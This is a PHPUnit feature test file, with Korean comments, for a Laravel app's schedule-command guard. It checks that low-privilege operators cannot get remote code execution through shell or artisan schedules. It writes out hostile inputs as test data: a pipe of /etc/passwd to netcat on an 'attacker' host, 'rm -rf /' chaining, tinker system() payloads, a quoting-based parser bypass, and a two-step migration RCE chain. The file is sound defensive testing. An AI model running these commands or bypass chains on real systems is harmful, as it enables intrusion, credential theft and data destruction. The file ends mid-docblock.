<?php

namespace Tests\Feature\Security;

use App\Enums\ScheduleResultStatus;
use App\Enums\ScheduleType;
use App\Models\Permission;
use App\Models\Role;
use App\Models\Schedule;
use App\Models\User;
use App\Services\ScheduleService;
use Illuminate\Contracts\Console\Kernel as ConsoleKernel;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Process;
use Illuminate\Validation\ValidationException;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * 스케줄 command 를 통한 권한 상승형 RCE 를 차단하는지 검증한다.
 *
 * 보고서(KVE-2026-1567) 주 시나리오: `core.schedules.read/create/run` 만 위임받은 저권한
 * 계정이 Shell/Artisan 스케줄을 생성 → 즉시 실행하여 서버에서 임의 OS 명령·임의 PHP 코드를
 * 실행하는 경로. 저장 시점(store/update 422)과 실행 시점(runSchedule 차단) 양쪽을 검증한다.
 */
class ScheduleCommandGuardTest extends TestCase
{
    use RefreshDatabase;

    private User $operator;

    private string $token;

    protected function setUp(): void
    {
        parent::setUp();

        // 보고서 시나리오의 "스케줄 운영자" — 스케줄 권한만 위임, is_super=0
        $this->operator = $this->createScheduleOperator();
        $this->token = $this->operator->createToken('test-token')->plainTextToken;
    }

    // ========================================================================
    // 저장 시점 — store/update 422
    // ========================================================================

    /**
     * 게이트가 꺼진 기본 상태에서 저권한 계정의 shell 스케줄 생성은 422 로 거부된다.
     *
     * @param  string  $command  악성/미허용 shell command
     */
    #[DataProvider('maliciousShellCommandProvider')]
    public function test_store_rejects_shell_command_when_gate_disabled(string $command): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => 'rce 시도',
            'type' => ScheduleType::Shell->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 저권한 계정의 차단목록 artisan 스케줄 생성은 422 로 거부된다.
     *
     * @param  string  $command  차단목록 artisan command
     *
     * @scenario command_class=denylisted, enforcement_point=store
     *
     * @effects denylist_blocks_destructive_and_code_executing_commands
     */
    #[DataProvider('deniedArtisanCommandProvider')]
    public function test_store_rejects_denylisted_artisan_command(string $command): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => 'artisan rce 시도',
            'type' => ScheduleType::Artisan->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 게이트를 켜고 실행 파일을 화이트리스트에 등록하면 정상 shell 스케줄 생성은 201 로 허용된다.
     */
    public function test_store_allows_whitelisted_shell_command_when_gate_enabled(): void
    {
        config([
            'schedule_security.shell.enabled' => true,
            'schedule_security.shell.allowed_binaries' => ['backup.sh'],
        ]);

        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '정상 백업 스케줄',
            'type' => ScheduleType::Shell->value,
            'command' => 'backup.sh --full',
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(201);
    }

    /**
     * 허용목록에 있는 정상 artisan 스케줄 생성은 201 로 허용된다.
     *
     * @scenario command_class=core_allowlisted, enforcement_point=store
     *
     * @effects allowlisted_maintenance_commands_still_run
     */
    public function test_store_allows_normal_artisan_command(): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '캐시 정리 스케줄',
            'type' => ScheduleType::Artisan->value,
            'command' => 'cache:clear',
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(201);
    }

    /**
     * 기존 shell 스케줄의 command 만 악성 값으로 바꾸는 update 요청도 422 로 거부된다
     * (PATCH 에 type 이 없어도 저장된 타입으로 폴백 검증).
     */
    public function test_update_rejects_malicious_shell_command_without_type_in_request(): void
    {
        $schedule = Schedule::create([
            'name' => '기존 스케줄',
            'type' => ScheduleType::Shell,
            'command' => 'backup.sh',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $response = $this->authRequest()->putJson(
            route('api.admin.schedules.update', ['schedule' => $schedule->id]),
            ['command' => 'id; cat /etc/passwd']
        );

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    // ========================================================================
    // 실행 시점 — runSchedule 차단 (DB 직접 주입 값 방어)
    // ========================================================================

    /**
     * 게이트가 꺼진 상태에서 DB 에 직접 심어진 shell 스케줄은 실행 시점에 차단된다
     * (저장 검증을 우회해 들어온 값 방어 — 마지막 방어선).
     */
    public function test_run_blocks_shell_schedule_when_gate_disabled(): void
    {
        Process::fake();

        $schedule = Schedule::create([
            'name' => 'DB 직접 주입 shell',
            'type' => ScheduleType::Shell,
            'command' => 'id',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $this->assertScheduleRunIsBlocked($schedule);
        Process::assertNothingRan();
    }

    /**
     * DB 에 직접 심어진 차단목록 artisan 스케줄은 실행 시점에 차단된다.
     *
     * @scenario command_class=denylisted, enforcement_point=run
     *
     * @effects run_blocks_denylisted_artisan_schedule
     */
    public function test_run_blocks_denylisted_artisan_schedule(): void
    {
        $schedule = Schedule::create([
            'name' => 'DB 직접 주입 artisan',
            'type' => ScheduleType::Artisan,
            'command' => 'tinker --execute=system("id");',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $this->assertScheduleRunIsBlocked($schedule);
    }

    /**
     * 게이트 on + 화이트리스트 등록 시, 허용된 shell 스케줄은 인자 배열로 실행된다
     * (문자열이 아닌 배열 → `/bin/sh -c` 미경유).
     */
    public function test_run_executes_whitelisted_shell_command_as_argument_array(): void
    {
        config([
            'schedule_security.shell.enabled' => true,
            'schedule_security.shell.allowed_binaries' => ['backup.sh'],
        ]);
        Process::fake(['*' => Process::result('done', '', 0)]);

        $schedule = Schedule::create([
            'name' => '정상 백업',
            'type' => ScheduleType::Shell,
            'command' => 'backup.sh --full /var/data',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        app(ScheduleService::class)->runSchedule($schedule);

        // 셸 미경유 검증: Process 에 문자열이 아닌 인자 배열이 전달됨
        Process::assertRan(function ($process) {
            return $process->command === ['backup.sh', '--full', '/var/data'];
        });
    }

    /**
     * 검증기가 본 명령명과 실제 실행되는 명령명이 갈리는 입력은 실행 시점에 차단된다.
     *
     * KVE-2026-1679 추가 발견분: 검증기는 `preg_split` 첫 토큰을 명령명으로 보지만,
     * `Artisan::call($command, [], ...)` 는 parameters 가 비어 있을 때 문자열 전체를
     * StringInput 으로 재파싱한다. Symfony 가 따옴표·백슬래시를 해석해 차단목록에 있는
     * `tinker` 가 그대로 실행되므로, 저장·실행 이중 검증이 둘 다 우회된다.
     *
     * 실행되었다면 임의 PHP 가 평가되어 마커 파일이 생성되므로, 마커 부재로
     * 위험 sink 미도달을 증명한다.
     *
     * @scenario command_class=parser_divergent, enforcement_point=run
     *
     * @effects run_blocks_parser_divergent_artisan_schedule, parser_divergent_payload_never_reaches_artisan
     */
    public function test_run_blocks_parser_divergent_artisan_schedule(): void
    {
        $marker = $this->parserDivergenceMarkerPath();

        if (is_file($marker)) {
            unlink($marker);
        }

        $schedule = Schedule::create([
            'name' => 'DB 직접 주입 — 파서 분기',
            'type' => ScheduleType::Artisan,
            // 검증기는 `"tinker"` 를 명령명으로 보지만 Symfony 는 `tinker` 로 해석한다.
            // --execute 값은 마커 경로를 chr() 로 조립해 따옴표 없이 구성한다.
            'command' => '"tinker" --execute=file_put_contents(sys_get_temp_dir().chr(47).chr(103).chr(55).chr(112).chr(53).chr(50).chr(55),1);',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $this->assertScheduleRunIsBlocked($schedule);

        $this->assertFileDoesNotExist(
            $marker,
            '파서 분기 페이로드가 실행되어 임의 PHP 가 평가됨 — 위험 sink 에 도달했다'
        );
    }

    /**
     * 허용목록에 없는 artisan 명령은 무해하더라도 저장 시점에 거부된다.
     *
     * 차단목록 방식에서 허용목록 방식으로 전환했음을 증명하는 대표 테스트다.
     * `route:list` `about` 은 파괴적이지 않지만 예약 실행 대상이 아니므로 통과하지 않는다.
     *
     * @param  string  $command  허용목록 밖 artisan command
     *
     * @scenario command_class=core_not_allowlisted, enforcement_point=store
     *
     * @effects store_rejects_artisan_command_outside_allowlist
     */
    #[DataProvider('notAllowlistedArtisanCommandProvider')]
    public function test_store_rejects_artisan_command_outside_allowlist(string $command): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '허용목록 밖 명령',
            'type' => ScheduleType::Artisan->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 검증기와 실행부의 해석이 갈리는 입력은 저장 시점에 거부된다.
     *
     * @param  string  $command  파서 분기를 유발하는 command
     * @param  string  $symfonyName  Symfony 가 실제로 해석하는 명령명
     *
     * @scenario command_class=parser_divergent, enforcement_point=store
     *
     * @effects store_rejects_parser_divergent_artisan_command
     */
    #[DataProvider('parserDivergentArtisanCommandProvider')]
    public function test_store_rejects_parser_divergent_artisan_command(string $command, string $symfonyName): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '파서 분기 위장',
            'type' => ScheduleType::Artisan->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422, "Symfony 가 '{$symfonyName}' 로 해석하는 입력이 저장됨: {$command}");
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 허용목록에 있는 명령이라도 선언되지 않은 옵션이 붙으면 저장 시점에 거부된다.
     *
     * 명령명만 막으면 허용된 명령의 위험 옵션이 그대로 남는다.
     *
     * @param  string  $command  미허용 옵션이 붙은 command
     *
     * @scenario command_class=core_allowlisted, enforcement_point=store
     *
     * @effects store_rejects_allowlisted_command_with_denied_option
     */
    #[DataProvider('deniedOptionArtisanCommandProvider')]
    public function test_store_rejects_allowlisted_command_with_denied_option(string $command): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '옵션 우회 시도',
            'type' => ScheduleType::Artisan->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 허용목록이 선언한 옵션은 그대로 저장된다 (정상 운영 경로 비파괴).
     *
     * @param  string  $command  허용 옵션이 붙은 command
     *
     * @scenario command_class=core_allowlisted, enforcement_point=store
     *
     * @effects store_allows_allowlisted_command_with_allowed_option
     */
    #[DataProvider('allowedOptionArtisanCommandProvider')]
    public function test_store_allows_allowlisted_command_with_allowed_option(string $command): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '정상 유지보수 스케줄',
            'type' => ScheduleType::Artisan->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(201, "허용되어야 하는 명령이 거부됨: {$command}");
    }

    /**
     * 기존 artisan 스케줄의 command 만 바꾸는 update 요청도 저장된 타입으로 폴백 검증된다.
     *
     * @scenario command_class=code_generating, enforcement_point=update
     *
     * @effects update_falls_back_to_the_stored_type_when_the_request_omits_it
     */
    public function test_update_rejects_artisan_command_outside_allowlist_without_type_in_request(): void
    {
        $schedule = Schedule::create([
            'name' => '기존 artisan 스케줄',
            'type' => ScheduleType::Artisan,
            'command' => 'cache:clear',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $response = $this->authRequest()->putJson(
            route('api.admin.schedules.update', ['schedule' => $schedule->id]),
            ['command' => 'make:migration evil --path=/tmp/g7 --realpath']
        );

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    /**
     * DB 에 직접 심어진 허용목록 밖 artisan 스케줄은 실행 시점에 차단된다.
     *
     * @scenario command_class=core_not_allowlisted, enforcement_point=run
     *
     * @effects run_blocks_artisan_schedule_outside_allowlist
     */
    public function test_run_blocks_artisan_schedule_outside_allowlist(): void
    {
        $schedule = Schedule::create([
            'name' => 'DB 직접 주입 — 허용목록 밖',
            'type' => ScheduleType::Artisan,
            'command' => 'route:list',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $this->assertScheduleRunIsBlocked($schedule);
    }

    /**
     * 허용된 artisan 스케줄은 문자열이 아니라 파싱된 (명령명, 인자배열) 로 실행된다.
     *
     * 인자 배열을 넘기면 Laravel 이 StringInput 대신 ArrayInput 분기를 타므로,
     * 저장된 문자열이 실행 직전에 재해석되는 지점 자체가 사라진다.
     * shell 쪽 `Process::assertRan` 인자배열 단언과 대칭이다.
     *
     * @scenario command_class=core_allowlisted, enforcement_point=run
     *
     * @effects run_dispatches_artisan_command_as_parsed_parameters
     */
    public function test_run_dispatches_artisan_command_as_parsed_parameters(): void
    {
        $captured = [];

        // Artisan::fake() 는 파라미터 단언을 제공하지 않으므로 Kernel 을 대역으로 세워
        // call() 에 넘어간 인자를 그대로 잡는다.
        $kernel = \Mockery::mock(ConsoleKernel::class)->shouldIgnoreMissing();
        $kernel->shouldReceive('call')
            ->once()
            ->andReturnUsing(function ($command, $parameters = [], $output = null) use (&$captured) {
                $captured = ['command' => $command, 'parameters' => $parameters];

                return 0;
            });
        $kernel->shouldReceive('output')->andReturn('');

        // 파사드가 이미 해석해 둔 인스턴스까지 교체해야 서비스가 대역을 본다.
        Artisan::swap($kernel);

        $schedule = Schedule::create([
            'name' => '큐 처리',
            'type' => ScheduleType::Artisan,
            'command' => 'queue:work --stop-when-empty --max-time=300',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        app(ScheduleService::class)->runSchedule($schedule);

        $this->assertSame('queue:work', $captured['command']);
        $this->assertSame(
            ['--stop-when-empty' => true, '--max-time' => '300'],
            $captured['parameters'],
            '실행부가 문자열을 그대로 넘겨 재파싱 지점이 남아 있다'
        );
    }

    /**
     * 형식이 어긋난 artisan command 는 저장 시점에 거부된다.
     *
     * 따옴표·백슬래시·단축 옵션·중복 옵션은 Symfony 가 다르게 해석할 여지를 만들므로
     * 명령명이 무엇이든 형태 단계에서 거부한다.
     *
     * @param  string  $command  형식이 어긋난 command
     *
     * @scenario command_class=malformed, enforcement_point=store
     *
     * @effects store_rejects_malformed_artisan_command
     */
    #[DataProvider('malformedArtisanCommandProvider')]
    public function test_store_rejects_malformed_artisan_command(string $command): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '형식 오류',
            'type' => ScheduleType::Artisan->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 저권한 운영자는 보고서의 2단계 RCE 체인(마이그레이션 파일 생성 → 실행)을 등록할 수 없다.
     *
     * KVE-2026-1679 보고서 주 시나리오. 1단계 `make:migration ... --path=` 로 공격자 제어
     * 경로에 PHP 파일을 만들고, 2단계 `migrate --path=` 로 그 파일을 실행하는 체인이다.
     * 두 단계 모두 저장 시점에 거부되어야 한다.
     *
     * @param  string  $command  체인 단계별 command
     *
     * @scenario command_class=code_generating, enforcement_point=store
     *
     * @effects low_privilege_operator_cannot_stage_migration_rce_chain
     */
    #[DataProvider('migrationRceChainProvider')]
    public function test_low_privilege_operator_cannot_stage_migration_rce_chain(string $command): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '마이그레이션 체인',
            'type' => ScheduleType::Artisan->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    // ========================================================================
    // Shell 인터프리터 정책 (KVE-2026-1653)
    // ========================================================================

    /**
     * 게이트를 켜고 `bash` 등 인터프리터를 화이트리스트에 등록해도, 인터프리터에
     * 인라인 명령/코드를 넘기는 저장 요청은 422 로 거부된다.
     *
     * KVE-2026-1653 본체: `bash` 를 화이트리스트에 등록하면 `bash -c id` 가 통과해
     * 임의 OS 명령이 실행됐다. 이제 첫 인자가 하이픈(코드 플래그)이면 저장 시점에 거부된다.
     *
     * @param  string  $command  인라인 코드/명령 command
     *
     * @scenario command_class=inline_code, enforcement_point=store
     *
     * @effects inline_code_flags_rejected
     */
    #[DataProvider('interpreterInlineCodeProvider')]
    public function test_store_rejects_interpreter_inline_code_even_when_allowlisted(string $command): void
    {
        $this->enableInterpreterShell();

        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '인라인 코드 시도',
            'type' => ScheduleType::Shell->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422, "인라인 코드가 저장됨: {$command}");
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 인터프리터 + 절대경로 스크립트 실행은 게이트를 켜고 등록하면 201 로 허용된다
     * (범용 크론 기능 회귀 가드).
     *
     * @param  string  $command  스크립트 파일 실행 command
     *
     * @scenario command_class=script_ok, enforcement_point=store
     *
     * @effects interpreter_script_files_still_run
     */
    #[DataProvider('interpreterScriptProvider')]
    public function test_store_allows_interpreter_running_absolute_script(string $command): void
    {
        $this->enableInterpreterShell();

        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '정상 스크립트 스케줄',
            'type' => ScheduleType::Shell->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(201, "정상 스크립트 실행이 거부됨: {$command}");
    }

    /**
     * `php artisan ...` 를 shell 로 실행하려는 저장 요청은 422 로 거부된다 (Artisan 축 우회 방지).
     *
     * @param  string  $command  artisan 우회 command
     *
     * @scenario command_class=artisan_bypass, enforcement_point=store
     *
     * @effects artisan_via_shell_rejected
     */
    #[DataProvider('artisanBypassShellProvider')]
    public function test_store_rejects_artisan_via_shell(string $command): void
    {
        $this->enableInterpreterShell();

        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => 'artisan 우회 시도',
            'type' => ScheduleType::Shell->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422, "artisan 우회가 저장됨: {$command}");
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 완전 거부형 실행기(env/make/xargs/sudo/busybox)는 화이트리스트에 등재돼도 422 로 거부된다.
     *
     * @param  string  $command  완전 거부형 command
     *
     * @scenario command_class=reject_binary, enforcement_point=store
     *
     * @effects reject_binaries_blocked_even_when_allowlisted
     */
    #[DataProvider('rejectBinaryShellProvider')]
    public function test_store_rejects_reject_binaries_even_when_allowlisted(string $command): void
    {
        $this->enableInterpreterShell();

        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '완전 거부형 시도',
            'type' => ScheduleType::Shell->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422, "완전 거부형이 저장됨: {$command}");
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 기존 shell 스케줄의 command 만 인라인 코드로 바꾸는 update 요청도 거부된다.
     *
     * @scenario command_class=inline_code, enforcement_point=update
     *
     * @effects update_falls_back_to_the_stored_type_when_the_request_omits_it
     */
    public function test_update_rejects_interpreter_inline_code_without_type_in_request(): void
    {
        $this->enableInterpreterShell();

        $schedule = Schedule::create([
            'name' => '기존 스크립트 스케줄',
            'type' => ScheduleType::Shell,
            'command' => 'bash /app/deploy.sh',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $response = $this->authRequest()->putJson(
            route('api.admin.schedules.update', ['schedule' => $schedule->id]),
            ['command' => 'bash -c id']
        );

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 게이트를 켜고 `bash` 를 등록한 상태에서 DB 에 직접 심어진 `bash -c id` 는
     * 실행 시점에 차단된다 (마지막 방어선 — 저장 검증 우회 값 방어).
     *
     * @scenario command_class=inline_code, enforcement_point=run
     *
     * @effects run_time_last_line_of_defense_blocks_inline_code
     */
    public function test_run_blocks_interpreter_inline_code_injected_directly(): void
    {
        $this->enableInterpreterShell();
        Process::fake();

        $schedule = Schedule::create([
            'name' => 'DB 직접 주입 — 인라인 코드',
            'type' => ScheduleType::Shell,
            'command' => 'bash -c id',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $this->assertScheduleRunIsBlocked($schedule);
        Process::assertNothingRan();
    }

    /**
     * 슈퍼 관리자도 인터프리터 인라인 코드는 저장할 수 없다 (권한 분기 무관 동일 차단).
     *
     * @scenario command_class=inline_code, enforcement_point=store, caller_role=super_admin
     *
     * @effects inline_code_flags_rejected
     */
    public function test_store_rejects_interpreter_inline_code_for_super_admin(): void
    {
        $this->enableInterpreterShell();

        // 검증 계층까지 도달하도록 스케줄 권한을 갖춘 계정에 is_super 를 부여한다 —
        // 슈퍼 관리자도 인라인 코드는 저장 단계에서 막힘을 증명하기 위함(권한 게이트가 아니라 검증).
        $superAdmin = $this->createScheduleOperator();
        $superAdmin->forceFill(['is_super' => true])->save();
        $superToken = $superAdmin->createToken('super-token')->plainTextToken;

        $response = $this->withHeaders([
            'Authorization' => 'Bearer '.$superToken,
            'Accept' => 'application/json',
        ])->postJson(route('api.admin.schedules.store'), [
            'name' => '슈퍼 관리자 인라인 코드',
            'type' => ScheduleType::Shell->value,
            'command' => 'bash -c id',
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    // ========================================================================
    // Helpers
    // ========================================================================

    /**
     * shell 게이트를 켜고 인터프리터·완전거부형을 화이트리스트에 등록합니다.
     *
     * 인터프리터를 **등재한 상태**로 검증해 "등재돼도 인라인코드/artisan/완전거부형은
     * 차단됨" 을 증명한다 (범용 크론 용도로 인터프리터 등록은 정상 운영이다).
     */
    private function enableInterpreterShell(): void
    {
        config([
            'schedule_security.shell.enabled' => true,
            'schedule_security.shell.allowed_binaries' => [
                'bash', 'sh', 'python', 'python3', 'php', 'node', 'perl', 'ruby',
                'env', 'make', 'xargs', 'sudo', 'busybox',
            ],
        ]);
    }

    /**
     * 파서 분기 페이로드가 실행되었을 때 생성되는 마커 파일 경로.
     *
     * command 문자열에는 따옴표를 넣을 수 없으므로(Symfony 가 해석해버린다) 페이로드는
     * 같은 경로를 `chr()` 연결로 조립한다. 두 값이 어긋나면 증명이 성립하지 않으므로
     * 여기서 한 번만 정의한다.
     */
    private function parserDivergenceMarkerPath(): string
    {
        return sys_get_temp_dir().chr(47).chr(103).chr(55).chr(112).chr(53).chr(50).chr(55);
    }

    /**
     * runSchedule 이 차단되어 실패 이력으로 기록되는지 단언합니다.
     *
     * runSchedule 은 실행 실패를 실패 이력으로 남긴 뒤 ValidationException 으로 전파한다.
     *
     * @param  Schedule  $schedule  실행 대상 스케줄
     */
    private function assertScheduleRunIsBlocked(Schedule $schedule): void
    {
        try {
            app(ScheduleService::class)->runSchedule($schedule);
            $this->fail("차단되어야 하는 스케줄이 실행됨: {$schedule->command}");
        } catch (ValidationException $e) {
            // 실행 실패 경로 — 아래에서 실패 이력을 확인한다
        }

        $this->assertSame(
            ScheduleResultStatus::Failed,
            $schedule->fresh()->last_result,
            "차단된 스케줄이 실패로 기록되지 않음: {$schedule->command}"
        );
    }

    /**
     * 인증된 JSON 요청 헬퍼.
     */
    private function authRequest(): static
    {
        return $this->withHeaders([
            'Authorization' => 'Bearer '.$this->token,
            'Accept' => 'application/json',
        ]);
    }

    /**
     * 스케줄 권한만 위임받은 저권한 "스케줄 운영자" 계정을 생성합니다.
     *
     * @return User is_super=0, core.schedules.read/create/update/run 만 보유
     */
    private function createScheduleOperator(): User
    {
        $user = User::factory()->create();

        $permissionIds = [];
        foreach (['core.schedules.read', 'core.schedules.create', 'core.schedules.update', 'core.schedules.run'] as $identifier) {
            $permission = Permission::firstOrCreate(
                ['identifier' => $identifier],
                [
                    'name' => json_encode(['ko' => $identifier, 'en' => $identifier]),
                    'description' => json_encode(['ko' => $identifier, 'en' => $identifier]),
                    'extension_type' => 'core',
                    'extension_identifier' => 'core',
                    'type' => 'admin',
                ]
            );
            $permissionIds[] = $permission->id;
        }

        $operatorRole = Role::create([
            'identifier' => 'schedule_operator_'.uniqid(),
            'name' => json_encode(['ko' => '스케줄 운영자', 'en' => 'Schedule Operator']),
            'is_active' => true,
        ]);
        $operatorRole->permissions()->sync($permissionIds);

        // isAdmin() 통과를 위한 admin 타입 역할 (설계상 admin 로그인 허용 — 진짜 결함은 능력 위임 범위)
        $adminRole = Role::firstOrCreate(
            ['identifier' => 'admin'],
            [
                'name' => json_encode(['ko' => '관리자', 'en' => 'Administrator']),
                'extension_type' => 'core',
                'extension_identifier' => 'core',
                'is_active' => true,
            ]
        );

        $user->roles()->attach($adminRole->id, ['assigned_at' => now()]);
        $user->roles()->attach($operatorRole->id, ['assigned_at' => now()]);

        return $user->fresh();
    }

    /**
     * 게이트 꺼진 상태에서 거부되어야 하는 shell command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function maliciousShellCommandProvider(): array
    {
        return [
            '임의 명령 (보고서 주 시나리오)' => ['id'],
            '체이닝' => ['backup.sh; rm -rf /'],
            '파이프 역쉘' => ['cat /etc/passwd | nc attacker 4444'],
            '명령치환' => ['echo $(id)'],
        ];
    }

    /**
     * 차단목록 artisan command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function deniedArtisanCommandProvider(): array
    {
        return [
            'tinker 임의 PHP 실행' => ['tinker --execute=system("id");'],
            'db:wipe 파괴적' => ['db:wipe'],
            'migrate:fresh 파괴적' => ['migrate:fresh'],
        ];
    }

    /**
     * 무해하지만 허용목록에 없어 거부되어야 하는 artisan command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function notAllowlistedArtisanCommandProvider(): array
    {
        return [
            'route:list — 정보 노출' => ['route:list'],
            'about — 환경 정보 노출' => ['about'],
            'queue:failed' => ['queue:failed'],
            'storage:link' => ['storage:link'],
            // KVE-2026-1897 회귀 가드: 언어팩 설치 명령은 예약 실행 허용목록 밖이므로 저장 시점에 거부된다
            // (커밋 #527 이 denylist→allowlist 로 전환한 뒤의 기대 동작을 고정).
            'language-pack:install — 확장 관리 명령' => ['language-pack:install g7-core-ja'],
            'language-pack:uninstall — 확장 관리 명령' => ['language-pack:uninstall g7-core-ja'],
        ];
    }

    /**
     * 보고서의 2단계 마이그레이션 RCE 체인.
     *
     * @return array<string, array{string}>
     */
    public static function migrationRceChainProvider(): array
    {
        return [
            '1단계 — 임의 경로에 PHP 파일 생성' => ['make:migration evil --create=x --path=/tmp/g7 --realpath'],
            '2단계 — 생성한 파일 실행' => ['migrate --path=/tmp/g7 --realpath --force'],
        ];
    }

    /**
     * 검증기와 Symfony 의 해석이 갈리는 command 목록.
     *
     * @return array<string, array{string, string}>
     */
    public static function parserDivergentArtisanCommandProvider(): array
    {
        return [
            '큰따옴표 위장' => ['"tinker" --execute=1', 'tinker'],
            '작은따옴표 위장' => ["'tinker' --execute=1", 'tinker'],
            '백슬래시 위장' => ['tin\\ker --execute=1', 'tinker'],
            '선행 옵션으로 명령명 밀어내기' => ['--env=local tinker', 'tinker'],
        ];
    }

    /**
     * 허용목록에 있으나 옵션·인자가 거부되어야 하는 command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function deniedOptionArtisanCommandProvider(): array
    {
        return [
            '미허용 옵션' => ['cache:clear --tags=a'],
            '워커 상주' => ['queue:work --daemon'],
            '안전장치 무력화' => ['queue:work --force'],
            '경로 지정' => ['model:prune --path=/tmp/g7'],
            '단축 옵션' => ['cache:clear -v'],
            '위치 인자' => ['cache:clear redis'],
        ];
    }

    /**
     * 형식이 어긋난 command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function malformedArtisanCommandProvider(): array
    {
        return [
            '단축 옵션' => ['cache:clear -v'],
            '중복 옵션' => ['queue:work --tries=1 --tries=9'],
            '옵션 구분자 단독' => ['cache:clear --'],
            '백슬래시' => ['cache\\:clear'],
        ];
    }

    /**
     * 허용목록이 선언한 옵션이 붙은 정상 command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function allowedOptionArtisanCommandProvider(): array
    {
        return [
            '옵션 없음' => ['optimize:clear'],
            '값 있는 옵션' => ['queue:prune-batches --hours=48'],
            '옵션 2개' => ['queue:work --stop-when-empty --max-time=300'],
            'SEO 레이아웃 지정' => ['seo:warmup --layout=home'],
        ];
    }

    /**
     * 인터프리터에 인라인 코드/명령을 넘기는 command 목록 (전부 차단).
     *
     * @return array<string, array{string}>
     */
    public static function interpreterInlineCodeProvider(): array
    {
        return [
            'bash -c id (본체)' => ['bash -c id'],
            'sh -c id' => ['sh -c id'],
            'python -c 코드' => ['python -c import_os'],
            'php -r 코드' => ['php -r phpinfo'],
            'node -e 코드' => ['node -e process'],
            'perl -e 코드' => ['perl -e system'],
            'bash -x 스크립트 앞 옵션' => ['bash -x /app/x.sh'],
        ];
    }

    /**
     * 인터프리터 + 절대경로 스크립트 command 목록 (전부 허용).
     *
     * @return array<string, array{string}>
     */
    public static function interpreterScriptProvider(): array
    {
        return [
            'python 스크립트' => ['python /app/job.py'],
            'php 스크립트' => ['php /app/legacy.php'],
            'node 스크립트' => ['node /app/worker.js'],
            '스크립트 + 인자' => ['python /app/job.py --daily'],
        ];
    }

    /**
     * shell 로 artisan 을 실행하려는 command 목록 (전부 차단).
     *
     * @return array<string, array{string}>
     */
    public static function artisanBypassShellProvider(): array
    {
        return [
            'php artisan' => ['php artisan'],
            'php 절대경로 artisan' => ['php /var/www/html/artisan'],
        ];
    }

    /**
     * 완전 거부형 실행기 command 목록 (전부 차단, 메타문자 없음).
